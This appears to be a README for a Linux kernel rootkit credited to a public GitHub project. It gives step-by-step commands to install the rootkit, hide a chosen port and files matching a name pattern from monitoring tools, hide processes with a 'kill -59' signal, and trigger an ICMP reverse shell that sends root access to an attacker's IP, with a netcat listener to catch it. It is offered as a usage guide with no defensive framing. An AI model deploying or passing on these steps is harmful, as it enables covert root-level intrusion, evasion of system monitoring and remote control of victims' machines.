# Rootkit

This Rootkit is from [Singularity rootkit](https://github.com/MatheuZSecurity/Singularity)

The install_rootkit.sh script is used to automate the configuration and installation of the rootkit.

Before the installation of the rootkit you should update some packages:
```
# RECOMENDABLE: When working with LKMs
sudo apt-get update
sudo apt-get install net-tools build-essential git linux-headers-$(uname -r)
```

## How to install and use the rootkit
```
install_rootkit.sh -p 8888 -pat naughty_pipe -ip <ATTACKER_IP>
```
This will install the rootkit and hide the `port 8888` and any file/directory that matches the `pattern "naughty_pipe"` from any monitoring tool of the sistem.

The `-ip` parameter is used to configure the ICMP triggered reverse shell. It specifies the IP to where it will send the reverse shell.

### ICMP triggered reverse shell
If you listen in the attacker's side with:
```
nc -lvnp 8081
```
And you run:
```
sudo python3 trigger.py <VICTIM_IP>
```
This will give you a reverse shell with root access to the victim.

### Hiding processes
Once installed the rootkit you can also hide any process by sending the following signal:
```
kill -59 <PID>
```

